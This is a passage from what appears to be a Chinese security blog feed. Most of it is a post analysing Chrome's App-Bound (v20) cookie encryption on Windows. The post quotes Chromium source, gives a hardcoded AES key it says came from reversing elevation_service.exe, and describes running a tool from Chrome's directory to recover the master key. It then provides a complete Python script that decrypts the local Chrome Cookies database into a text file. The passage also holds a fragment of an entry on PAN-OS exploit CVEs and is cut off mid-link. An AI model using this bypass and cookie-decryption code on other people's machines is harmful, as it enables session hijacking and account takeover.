href="https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/">Pots and Pans, AKA an SSLVPN - Palo Alto PAN-OS CVE-2024-0012 and CVE-2024-9474</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://security.paloaltonetworks.com/CVE-2024-9474&quot;&gt;CVE-2024-9474&lt;/a&gt;（CVSS 评分：6.9）- &lt;strong&gt;Palo Alto Networks PAN-OS软</summary>
      
    
    
    
    <category term="exploit" scheme="https://0or1zo.github.io/categories/exploit/"/>
    
    
    <category term="Palo Alto PAN-OS" scheme="https://0or1zo.github.io/tags/Palo-Alto-PAN-OS/"/>
    
    <category term="CVE-2024-0012" scheme="https://0or1zo.github.io/tags/CVE-2024-0012/"/>
    
    <category term="CVE-2024-9474" scheme="https://0or1zo.github.io/tags/CVE-2024-9474/"/>
    
  </entry>
  
  <entry>
    <title>ChromeCookies之v20解密</title>
    <link href="https://0or1zo.github.io/2024/11/09/ChromeCookies%E4%B9%8Bv20%E8%A7%A3%E5%AF%86/"/>
    <id>https://0or1zo.github.io/2024/11/09/ChromeCookies%E4%B9%8Bv20%E8%A7%A3%E5%AF%86/</id>
    <published>2024-11-09T11:02:09.000Z</published>
    <updated>2024-11-29T11:30:10.484Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近Google对Windows版Chrome中存储的Cookie的保护机制做了升级，即<code>应用程序绑定加密</code>。在Chrome 127中，在Windows上引入了一种新的保护措施，通过提供应用程序绑定（<code>App-Bound</code>）的加密方式来改进旧版Google Chrome所使用的Windows原生数据保护API(DPAPI)的加密方式，从而保护Cookie。</p><div class="note info flat"><p>以下是官方的相关资料：</p><ul><li><a href="https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html">Improving the security of Chrome cookies on Windows —— Google Security Blog</a> </li><li><a href="https://drive.google.com/file/d/1xMXmA0UJifXoTHjHWtVir2rb94OsxXAI/view">Chrome app-bound encryption Service - 2024-07-11.pdf</a></li></ul></div><h1 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h1><p><code>App-Bound加密</code>依靠特权服务来验证请求应用程序的身份。它通过将数据存储在加密的数据文件中，并使用以SYSTEM身份运行的服务来验证任何解密尝试是否来自Chrome进程，然后将密钥返回到该进程以解密存储的数据来实现这一点。在加密过程中，App-Bound加密服务将应用程序的身份编码到加密数据中，然后在尝试解密时验证其是否有效。如果系统上的另一个应用程序尝试解密相同的数据，它将失败。</p><p><img src="/img/ChromeCookies%E4%B9%8Bv20%E8%A7%A3%E5%AF%86/1.png" alt="Chrome 127 应用程序绑定加密方案。来源：https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html"></p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>公开的Chromium源代码地址：<a href="https://source.chromium.org/">https://source.chromium.org/</a></p><p>Chrome存储数据的SQLite数据库中的加密值现在以<code>v20</code>为前缀，表明这些值现在使用应用程序绑定加密进行加密。</p><p><img src="/img/ChromeCookies%E4%B9%8Bv20%E8%A7%A3%E5%AF%86/2.png"></p><p>以<code>v20</code>、<code>app-bound encryption</code>作为切入点。</p><p><strong>这里只贴了关键部分的代码。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/os_crypt/app_bound_encryption_provider_win.cc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 应用程序绑定加密管理的加密密钥的前缀名称。</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">char</span> kEncryptedKeyPrefName[] = <span class="string">&quot;os_crypt.app_bound_encrypted_key&quot;</span>;</span><br><span class="line"><span class="comment">// 使用应用程序绑定加密加密的密钥的密钥前缀。这用于验证从前缀检索到的加密密钥数据是否有效。</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">uint8_t</span> kCryptAppBoundKeyPrefix[] = &#123;<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;B&#x27;</span>&#125;;</span><br><span class="line"><span class="comment">// 使用应用程序绑定加密密钥加密的数据的标记。OSCryptAsync 使用它来标识已使用此密钥加密的数据。</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">char</span> kAppBoundDataPrefix[] = <span class="string">&quot;v20&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取loacl state中的加密密钥</span></span><br><span class="line">base::expected&lt;std::vector&lt;<span class="type">uint8_t</span>&gt;, AppBoundEncryptionProviderWin::KeyRetrievalStatus&gt;</span><br><span class="line">AppBoundEncryptionProviderWin::<span class="built_in">RetrieveEncryptedKey</span>() &#123;</span><br><span class="line">  <span class="comment">// 获取加密密钥</span></span><br><span class="line">  <span class="type">const</span> std::string base64_encrypted_key = local_state_-&gt;<span class="built_in">GetString</span>(kEncryptedKeyPrefName);</span><br><span class="line">  <span class="comment">// 进行 Base64 解码</span></span><br><span class="line">  std::optional&lt;std::vector&lt;<span class="type">uint8_t</span>&gt;&gt; encrypted_key_with_header = base::<span class="built_in">Base64Decode</span>(base64_encrypted_key);</span><br><span class="line">  <span class="comment">// 去掉密钥前缀并返回最终密钥</span></span><br><span class="line">  <span class="keyword">return</span> std::<span class="built_in">vector</span>&lt;<span class="type">uint8_t</span>&gt;(encrypted_key_with_header-&gt;<span class="built_in">cbegin</span>() + <span class="built_in">sizeof</span>(kCryptAppBoundKeyPrefix), encrypted_key_with_header-&gt;<span class="built_in">cend</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取加密密钥并通过回调函数返回密钥</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AppBoundEncryptionProviderWin::GetKey</span><span class="params">(KeyCallback callback)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 调用 RetrieveEncryptedKey 获取加密密钥</span></span><br><span class="line">  <span class="keyword">auto</span> encrypted_key_data = <span class="built_in">RetrieveEncryptedKey</span>();</span><br><span class="line">  <span class="comment">// 如果密钥存在，进行解密</span></span><br><span class="line">  <span class="keyword">if</span> (encrypted_key_data.<span class="built_in">has_value</span>()) &#123;</span><br><span class="line">    <span class="comment">// 有密钥，在后台工作者上执行解密。</span></span><br><span class="line">    com_worker_.<span class="built_in">AsyncCall</span>(&amp;AppBoundEncryptionProviderWin::COMWorker::DecryptKey)</span><br><span class="line">        .<span class="built_in">WithArgs</span>(std::<span class="built_in">move</span>(encrypted_key_data.<span class="built_in">value</span>()))</span><br><span class="line">        .<span class="built_in">Then</span>(base::<span class="built_in">BindOnce</span>(&amp;AppBoundEncryptionProviderWin::ReplyWithKey,</span><br><span class="line">                             std::<span class="built_in">move</span>(callback)));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 没有密钥，则生成一个新密钥，但只能在完全受支持的系统上生成。</span></span><br><span class="line">  <span class="comment">// 生成一个大小为 256 位（32 字节）的随机密钥，使用的是 AES-256-GCM 加密算法所需的密钥长度。</span></span><br><span class="line">  <span class="comment">// 从这里可以得知初始密钥的大小，原始密钥的加密方式。</span></span><br><span class="line">  <span class="type">const</span> <span class="keyword">auto</span> random_key = crypto::<span class="built_in">RandBytesAsVector</span>(os_crypt_async::Encryptor::Key::kAES256GCMKeySize);</span><br><span class="line">  <span class="comment">// 复制密钥。加密操作完成后，这将作为提供商的未加密密钥返回。</span></span><br><span class="line">  <span class="function">std::vector&lt;<span class="type">uint8_t</span>&gt; <span class="title">decrypted_key</span><span class="params">(random_key.cbegin(), random_key.cend())</span></span>;</span><br><span class="line">  <span class="comment">// 在后台工作者上执行加密。</span></span><br><span class="line">  com_worker_.<span class="built_in">AsyncCall</span>(&amp;AppBoundEncryptionProviderWin::COMWorker::EncryptKey)</span><br><span class="line">      .<span class="built_in">WithArgs</span>(std::<span class="built_in">move</span>(random_key))</span><br><span class="line">      .<span class="built_in">Then</span>(base::<span class="built_in">BindOnce</span>(</span><br><span class="line">          &amp;AppBoundEncryptionProviderWin::StoreEncryptedKeyAndReply,</span><br><span class="line">          weak_factory_.<span class="built_in">GetWeakPtr</span>(), std::<span class="built_in">move</span>(decrypted_key),</span><br><span class="line">          std::<span class="built_in">move</span>(callback)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 加密和解密 API，用于处理和保护应用程序绑定数据（App-Bound Encryption）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AppBoundEncryptionProviderWin</span>::COMWorker &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  std::optional&lt;<span class="type">const</span> std::vector&lt;<span class="type">uint8_t</span>&gt;&gt; <span class="built_in">DecryptKey</span>(<span class="type">const</span> std::vector&lt;<span class="type">uint8_t</span>&gt;&amp; encrypted_key) &#123;</span><br><span class="line">    <span class="comment">// 调用 os_crypt::DecryptAppBoundString，将解密结果存储到 decrypted_key_string</span></span><br><span class="line">    <span class="comment">// chrome/browser/os_crypt/app_bound_encryption_win.cc</span></span><br><span class="line">    HRESULT res = os_crypt::<span class="built_in">DecryptAppBoundString</span>(encrypted_key_string, decrypted_key_string, last_error, &amp;log_message);</span><br><span class="line">    <span class="comment">// 将数据复制到向量。</span></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">uint8_t</span>&gt; <span class="title">data</span><span class="params">(decrypted_key_string.cbegin(), decrypted_key_string.cend())</span></span>;</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/os_crypt/app_bound_encryption_win.cc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// DecryptAppBoundString 通过 COM 接口 IElevator 来完成解密操作，并将结果保存在 plaintext 中。</span></span><br><span class="line"><span class="function">HRESULT <span class="title">DecryptAppBoundString</span><span class="params">(<span class="type">const</span> std::string&amp; ciphertext, std::string&amp; plaintext, DWORD&amp; last_error, std::string* log_message)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 初始化 COM 环境</span></span><br><span class="line">  base::win::<span class="built_in">AssertComInitialized</span>();</span><br><span class="line">  <span class="comment">// 创建 IElevator 对象</span></span><br><span class="line">  Microsoft::WRL::ComPtr&lt;IElevator&gt; elevator;</span><br><span class="line">  <span class="comment">// ::CoCreateInstance 调用使用 GetElevatorClsid 和 GetElevatorIid 获取相关的 CLSID 和 IID，来创建一个 IElevator 的实例。这个实例是 COM 接口，用于调用 DecryptData 函数来解密数据。</span></span><br><span class="line">  HRESULT hr = ::<span class="built_in">CoCreateInstance</span>(install_static::<span class="built_in">GetElevatorClsid</span>(), <span class="literal">nullptr</span>, CLSCTX_LOCAL_SERVER, install_static::<span class="built_in">GetElevatorIid</span>(), <span class="built_in">IID_PPV_ARGS_Helper</span>(&amp;elevator));</span><br><span class="line">  <span class="comment">// 通过 ::CoSetProxyBlanket 配置代理安全选项，包括授权和认证级别。这一步确保了远程过程调用 (RPC) 的隐私和代理安全性。</span></span><br><span class="line">  hr = ::<span class="built_in">CoSetProxyBlanket</span>(elevator.<span class="built_in">Get</span>(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, <span class="literal">nullptr</span>, EOAC_DYNAMIC_CLOAKING);</span><br><span class="line">  <span class="comment">// 将密文字符串转换为 BSTR 类型</span></span><br><span class="line">  base::win::ScopedBstr ciphertext_data;</span><br><span class="line">  ::<span class="built_in">memcpy</span>(ciphertext_data.<span class="built_in">AllocateBytes</span>(ciphertext.<span class="built_in">length</span>()), ciphertext.<span class="built_in">data</span>(), ciphertext.<span class="built_in">length</span>());</span><br><span class="line">  base::win::ScopedBstr plaintext_data;</span><br><span class="line">  <span class="comment">// 调用 IElevator 接口中的 DecryptData 方法，解密 ciphertext_data 并将结果存储到 plaintext_data</span></span><br><span class="line">  <span class="comment">// out/win-Debug/gen/chrome/elevation_service/elevation_service_idl.h</span></span><br><span class="line">  <span class="comment">// chrome/elevation_service/elevator.cc</span></span><br><span class="line">  hr = elevator-&gt;<span class="built_in">DecryptData</span>(ciphertext_data.<span class="built_in">Get</span>(), plaintext_data.<span class="built_in">Receive</span>(), &amp;last_error);</span><br><span class="line">  <span class="comment">// 将 plaintext_data 中的 BSTR 数据转化为 std::string 格式，并存储到 plaintext</span></span><br><span class="line">  plaintext.<span class="built_in">assign</span>(<span class="built_in">reinterpret_cast</span>&lt;std::string::value_type*&gt;(plaintext_data.<span class="built_in">Get</span>()), plaintext_data.<span class="built_in">ByteLength</span>());</span><br><span class="line">  <span class="keyword">return</span> S_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://source.chromium.org/chromium/chromium/src/+/main:chrome/elevation_service/elevator.cc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 SYSTEM dpapi 存储解密和 user dpapi 存储解密，如果运行在 Chrome 环境中，会多一步 AES 解密。</span></span><br><span class="line"><span class="function">HRESULT <span class="title">Elevator::DecryptData</span><span class="params">(<span class="type">const</span> BSTR ciphertext, BSTR* plaintext, DWORD* last_error)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 获取密文的字节长度</span></span><br><span class="line">  UINT length = ::<span class="built_in">SysStringByteLen</span>(ciphertext);</span><br><span class="line">  <span class="comment">// 准备数据结构</span></span><br><span class="line">  DATA_BLOB input = &#123;&#125;;</span><br><span class="line">  input.cbData = length;</span><br><span class="line">  input.pbData = <span class="built_in">reinterpret_cast</span>&lt;BYTE*&gt;(ciphertext);</span><br><span class="line">  DATA_BLOB intermediate = &#123;&#125;;</span><br><span class="line">  <span class="comment">//使用 SYSTEM dpapi 进行第一次解密</span></span><br><span class="line">  <span class="keyword">if</span> (!::<span class="built_in">CryptUnprotectData</span>(&amp;input, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, <span class="number">0</span>, &amp;intermediate)) &#123;</span><br><span class="line">    *last_error = ::<span class="built_in">GetLastError</span>();</span><br><span class="line">    <span class="keyword">return</span> kErrorCouldNotDecryptWithSystemContext;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 模拟当前调用进程的客户端身份，后续操作能在用户上下文中执行（用户上下文存储的密钥用于解密）</span></span><br><span class="line">  HRESULT hr = ::<span class="built_in">CoImpersonateClient</span>();</span><br><span class="line">  <span class="comment">// 第二次解密</span></span><br><span class="line">  std::string plaintext_str;</span><br><span class="line">  &#123;</span><br><span class="line">    DATA_BLOB output = &#123;&#125;;</span><br><span class="line">    <span class="comment">// 使用 user dpapi 进行第二次解密</span></span><br><span class="line">    <span class="keyword">if</span> (!::<span class="built_in">CryptUnprotectData</span>(&amp;intermediate, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, <span class="number">0</span>, &amp;output)) &#123;</span><br><span class="line">      *last_error = ::<span class="built_in">GetLastError</span>();</span><br><span class="line">      <span class="keyword">return</span> kErrorCouldNotDecryptWithUserContext;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 提取验证数据并验证</span></span><br><span class="line">    <span class="function">std::string <span class="title">mutable_plaintext</span><span class="params">(<span class="keyword">reinterpret_cast</span>&lt;<span class="type">char</span>*&gt;(output.pbData), output.cbData)</span></span>;</span><br><span class="line">    <span class="type">const</span> std::string validation_data = <span class="built_in">PopFromStringFront</span>(mutable_plaintext);</span><br><span class="line">    <span class="type">const</span> <span class="keyword">auto</span> data = std::<span class="built_in">vector</span>&lt;<span class="type">uint8_t</span>&gt;(validation_data.<span class="built_in">cbegin</span>(), validation_data.<span class="built_in">cend</span>());</span><br><span class="line">    <span class="type">const</span> <span class="keyword">auto</span> process = <span class="built_in">GetCallingProcess</span>();</span><br><span class="line">    <span class="comment">// 对身份令牌和调用进程路径进行验证</span></span><br><span class="line">    HRESULT validation_result = </span><br><span class="line">    (process, data, &amp;log_message);</span><br><span class="line">    <span class="comment">// 提取明文数据并处理</span></span><br><span class="line">    plaintext_str = <span class="built_in">PopFromStringFront</span>(mutable_plaintext);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 如果代码运行在 Chrome 环境中，使用 PostProcessData 对明文进行后处理。</span></span><br><span class="line"><span class="comment">// 这里应该是 AES 解密，解密步骤是内部代码的一部分，因此需要对发布的二进制文件（elevation_service.exe）进行逆向工程。</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> BUILDFLAG(GOOGLE_CHROME_BRANDING)</span></span><br><span class="line">  <span class="keyword">auto</span> post_process_result = <span class="built_in">PostProcessData</span>(plaintext_str);</span><br><span class="line">  <span class="keyword">if</span> (!post_process_result.<span class="built_in">has_value</span>()) &#123;</span><br><span class="line">    <span class="keyword">return</span> post_process_result.<span class="built_in">error</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  plaintext_str.<span class="built_in">swap</span>(*post_process_result);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  <span class="comment">// BUILDFLAG(GOOGLE_CHROME_BRANDING)</span></span></span><br><span class="line">  <span class="comment">// 分配内存并返回明文</span></span><br><span class="line">  *plaintext = ::<span class="built_in">SysAllocStringByteLen</span>(plaintext_str.<span class="built_in">c_str</span>(), plaintext_str.<span class="built_in">length</span>());</span><br><span class="line">  <span class="keyword">return</span> S_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>elevation_service.exe没有使用混淆，可以使用Ghidra对进行逆向分析，这里是以<code>CryptUnprotectData</code>函数作为切入点。</p><p><img src="/img/ChromeCookies%E4%B9%8Bv20%E8%A7%A3%E5%AF%86/3.png"></p><p><img src="/img/ChromeCookies%E4%B9%8Bv20%E8%A7%A3%E5%AF%86/4.png"></p><p><code>CryptUnprotectData</code> -&gt; <code>14002a5d2FUN_14002a550CallCALL qword ptr [-&gt;CRYPT32.DLL::CryptUnprotectData]</code></p><p>继续跟进下去就可以发现在进行两次DPAPI解密后，还需要再进行一次AES解密，AES函数的特征还是很容易识别的。</p><p>程序中的密钥硬编码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">B3 1C 6E 24 1A C8 46 72  8D A9 C1 FA C4 93 66 51</span><br><span class="line">CF FB 94 4D 14 3A B8 16  27 6B CC 6D A0 28 47 87</span><br></pre></td></tr></table></figure><h1 id="v20解密方法"><a href="#v20解密方法" class="headerlink" title="v20解密方法"></a>v20解密方法</h1><h2 id="Google-Chrome-Elevation-Service"><a href="#Google-Chrome-Elevation-Service" class="headerlink" title="Google Chrome Elevation Service"></a>Google Chrome Elevation Service</h2><p><a href="https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption">https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption</a></p><p>利用每个浏览器独有的内部<a href="https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/os_crypt/app_bound_encryption_win.cc;l=163">基于COM的IElevator服务</a>来检索和解密密钥，其实就是调用了原生的<a href="https://chromium.googlesource.com/chromium/src/+/main/chrome/elevation_service/">Google Chrome Elevation Service</a>进行解密。</p><p><img src="/img/ChromeCookies%E4%B9%8Bv20%E8%A7%A3%E5%AF%86/5.png"></p><p>将<code>chrome_decrypt.cpp</code>编译成可执行文件exe，把编译后的可执行文件放在Chrome应用程序目录中（例如<code>C:\Program Files\Google\Chrome\Application</code>），从命令行运行可执行文件：</p><p><img src="/img/ChromeCookies%E4%B9%8Bv20%E8%A7%A3%E5%AF%86/6.png"></p><p>上图中<code>DECRYPED KEY</code>就是最终解出来的密钥，后续就可以利用这个密钥去解cookie。</p><div class="note warning flat"><p>由于ABE的<a href="https://source.chromium.org/chromium/chromium/src/+/main:chrome/elevation_service/caller_validation.cc;l=33">路径验证</a>限制，此工具一定要在每个浏览器的应用程序目录下运行。</p></div><p>用该密钥解Cookies文件的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pathlib</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">decrypted_key, db_path, output</span>):</span><br><span class="line">    key = binascii.unhexlify(decrypted_key)</span><br><span class="line">    con = sqlite3.connect(pathlib.Path(db_path).as_uri() + <span class="string">&quot;?mode=ro&quot;</span>, uri=<span class="literal">True</span>)</span><br><span class="line">    cur = con.cursor()</span><br><span class="line">    r = cur.execute(<span class="string">&quot;SELECT host_key, path, name, CAST(encrypted_value AS BLOB), is_secure, is_httponly, samesite, creation_utc, expires_utc,last_access_utc from cookies;&quot;</span>)</span><br><span class="line">    cookies = cur.fetchall()</span><br><span class="line">    cookies_v20 = [c <span class="keyword">for</span> c <span class="keyword">in</span> cookies <span class="keyword">if</span> c[<span class="number">3</span>][:<span class="number">3</span>] == <span class="string">b&quot;v20&quot;</span>]</span><br><span class="line">    con.close()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output, <span class="string">&quot;a&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> w:</span><br><span class="line">        w.write(<span class="string">&quot;host_key\tpath\tname\tvalue\tis_secure\tis_httponly\tsamesite\tcreation_utc\texpires_utc\tlast_access_utc\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> cookies_v20:</span><br><span class="line">            w.write(<span class="string">&quot;\t&quot;</span>.join(c[:<span class="number">3</span>]) + <span class="string">&quot;\t&quot;</span> + decrypt_cookie_v20(key, c[<span class="number">3</span>]) +<span class="string">&quot;\t&quot;</span> + <span class="string">&quot;\t&quot;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> c[<span class="number">4</span>:]]) +<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_17bit_to_unix_timestamp</span>(<span class="params">seventeen_bit_timestamp</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fourteen_bit_timestamp = seventeen_bit_timestamp // <span class="number">1000</span></span><br><span class="line">        EPOCH_DIFFERENCE = <span class="number">11644473600</span></span><br><span class="line">        unix_timestamp = fourteen_bit_timestamp / <span class="number">1000</span> - EPOCH_DIFFERENCE</span><br><span class="line">        <span class="keyword">return</span> datetime.datetime.utcfromtimestamp(unix_timestamp)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> seventeen_bit_timestamp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_cookie_v20</span>(<span class="params">key, encrypted_value</span>):</span><br><span class="line">    cookie_iv = encrypted_value[<span class="number">3</span>:<span class="number">3</span> + <span class="number">12</span>]</span><br><span class="line">    encrypted_cookie = encrypted_value[<span class="number">3</span> + <span class="number">12</span>:-<span class="number">16</span>]</span><br><span class="line">    cookie_tag = encrypted_value[-<span class="number">16</span>:]</span><br><span class="line">    cookie_cipher = AES.new(key, AES.MODE_GCM, nonce=cookie_iv)</span><br><span class="line">    decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie,cookie_tag)</span><br><span class="line">    <span class="keyword">return</span> decrypted_cookie[<span class="number">32</span>:].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key = <span class="string">&quot;7e6b050c93433d27caafabed266d9cf71179142f2106c4e72bced66d0c8aaa9d&quot;</span></span><br><span class="line">    LOCAL_APP_DATA = os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>]</span><br><span class="line">    db_path = <span class="string">rf&quot;<span class="subst">&#123;LOCAL_APP_DATA&#125;</span>\Google\Chrome\User Data\Default\Network\Cookies&quot;</span></span><br><span class="line">    output = <span class="string">&quot;Cookies.txt&quot;</span></span><br><span class="line">    decrypt(key, db_path, output)</span><br></pre></td></tr></table></figure><h2 id="chrome-v20-decryption"><a href="#chrome-v20-decryption" class="headerlink" title="chrome_v20_decryption"></a>chrome_v20_decryption</h2><p>该作者根据分析Chromium source code，写了对应的python解密脚本<br><a href="https://github.com/runassu/chrome_v20_decryption/issues/7#issuecomment-2445724559">https://github.com/runassu/chrome_v20_decryption/issues/7#issuecomment-2445724559</a></p><ul><li><p>版本一：通过创建本地服务使用Windows API。<br><a 